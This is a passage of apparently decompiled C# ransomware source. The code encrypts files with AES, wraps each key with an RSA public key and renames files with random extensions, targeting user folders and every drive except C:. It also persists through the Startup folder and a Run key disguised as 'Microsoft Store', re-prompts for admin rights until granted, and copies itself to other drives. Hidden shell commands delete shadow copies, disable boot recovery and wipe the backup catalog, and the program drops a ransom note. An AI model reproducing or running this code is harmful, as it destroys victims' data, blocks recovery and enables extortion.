		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
